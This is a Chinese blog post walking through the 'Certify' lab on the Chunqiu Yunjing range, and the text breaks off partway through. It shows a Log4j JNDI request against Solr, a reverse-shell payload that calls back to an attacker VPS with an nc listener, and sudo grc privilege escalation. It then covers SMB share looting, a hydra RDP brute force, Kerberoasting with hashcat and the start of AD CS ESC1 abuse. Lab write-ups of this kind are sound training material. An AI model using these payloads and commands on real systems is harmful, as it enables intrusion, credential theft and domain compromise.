---
title: 春秋云镜-【仿真场景】Certify writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17187351.html
source: 博客园 - 渗透测试中心
date: 2023-03-08
fetch_date: 2025-10-04T08:55:16.885309
---

# 春秋云镜-【仿真场景】Certify writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [春秋云镜-【仿真场景】Certify writeup](https://www.cnblogs.com/backlion/p/17187351.html "发布于 2023-03-07 11:06")

## 说明

Certify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。

## 技术

Solr、AD CS、SMB、Kerberos、域渗透

## 第一个flag

### log4j RCE

扫描外网IP

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110517262-27201457.png)

发现solr存在log4j的组件，测试是否存在rce

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110518011-2082945395.png)

```
GET /solr/admin/cores?action=${jndi:ldap://1p9bvr.dnslog.cn} HTTP/1.1
Host: 47.92.113.194:8983
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://47.92.113.194:8983/solr/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Connection: close
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110518750-1249723470.png)

dnslog回显

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110519454-847276684.png)

JNDI反弹shell，在VPS上开启

```
# 加载恶意类
java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 47.103.xxx.xxx

#开启监听
nc -lvvp 5555
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110520161-1238749396.png)

payload

```
${jndi:ldap://47.103.xxx.xxx:1389/Basic/ReverseShell/47.103.xxx.xxx/5555}
```

发送请求

```
GET /solr/admin/cores?action=${jndi:ldap://47.103.xxx.xxx:1389/Basic/ReverseShell/47.103.xxx.xxx/5555}&wt=json HTTP/1.1
Host: 47.92.113.194:8983
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://47.92.113.194:8983/solr/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Connection: close
```

成功反弹shell

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110520957-1838953280.png)

sudo提权

```
sudo -l
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110521790-296300015.png)

```
sudo grc --help
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110522600-1875494381.png)

```
sudo grc --pty whoami
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110523204-310705807.png)

查找flag

```
sudo grc --pty find / -name flag*
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110523944-186127248.png)

输出flag

```
sudo grc --pty cat /root/flag/flag01.txt
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110524763-1879119967.png)

## 第二个flag

### 内网渗透

出口机器上代理，并扫描内网，具体就不赘述了(架设http服务，wget 下载npc和fscan)

```
172.22.9.13:445 open
172.22.9.26:445 open
172.22.9.47:445 open
172.22.9.7:445 open
172.22.9.26:139 open
172.22.9.47:139 open
172.22.9.7:139 open
172.22.9.26:135 open
172.22.9.13:139 open
172.22.9.13:135 open
172.22.9.7:135 open
172.22.9.26:80 open
172.22.9.47:80 open
172.22.9.19:80 open
172.22.9.47:22 open
172.22.9.47:21 open
172.22.9.19:22 open
172.22.9.7:88 open
172.22.9.19:8983 open
[+] NetInfo:
[*]172.22.9.13
   [->]CA01
   [->]172.22.9.13
[*] 172.22.9.7     [+]DC XIAORANG\XIAORANG-DC
[*] 172.22.9.26          XIAORANG\DESKTOP-CBKTVMO
[+] NetInfo:
[*]172.22.9.26
   [->]DESKTOP-CBKTVMO
   [->]172.22.9.26
[+] NetInfo:
[*]172.22.9.7
   [->]XIAORANG-DC
   [->]172.22.9.7
[*] 172.22.9.13          XIAORANG\CA01
[*] WebTitle:http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] WebTitle:http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
[*] 172.22.9.47          WORKGROUP\FILESERVER        Windows 6.1
[*] 172.22.9.47  (Windows 6.1)
[*] WebTitle:http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
[*] WebTitle:http://172.22.9.26        code:200 len:703    title:IIS Windows Server
[*] WebTitle:http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin
```

发现以下资产

```
172.22.9.19 入口IP
172.22.9.7  DC
172.22.9.26 域成员
172.22.9.47 文件服务器
172.22.9.13 CA
```

根据提示，文件服务器应该存在smb的共享，进一步收集信息

注意：fscan不扫描smb的共享模式，所以可以采用nmap来扫描

```
sudo grc --pty nmap -sT -A 172.22.9.47
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110525634-224058230.png)

使用 smbclient 连接共享

```
proxychains smbclient \\\\172.22.9.47\\fileshare
dir
get personnel.db
get secret\flag02.txt
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110526730-874103981.png)

获得falg02，还有一段提示 you have enumerated smb. But do you know what an SPN is?

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110527663-561253035.png)

## 第三个flag

数据库文件中有几个用户名和密码

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110528608-1922222552.png)

rdp破解

```
proxychains hydra -L user.txt -P pwd.txt 172.22.9.26 rdp -vV -e ns
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110529424-1574261648.png)

获得了两个账号，但是无法远程登录

### Kerberoast攻击

使用GetUserSPNs.py寻找注册在域用户下的SPN

```
proxychains python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110530267-940825500.png)

hash 离线破解，速度很快，1.txt 是hash值，rockyou.txt 是kali自带的密码本

```
hashcat64.exe -m 13100 1.txt rockyou.txt
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110531096-261013704.png)

得到zhangxia/MyPass2@@6，使用账号密码远程登录即可

注意，因为是域账号所以用户名为 zhangxia@xiaorang.lab，登录完成后并不能直接访问administrator的目录查找flag，因为不是管理员权限

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110531761-1694751780.png)

### ADCS ESC1

使用Certify.exe定位漏洞

```
Certify.exe find /vulnerable
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110532827-710567663.png)

ESC1利用前提条件：

msPKI-Certificates-Name-Flag: ENROLLEE\_SUPPLIES\_SUBJECT

表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户
PkiExtendedKeyUsage: Client Authentication

表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证

Enrollment Right...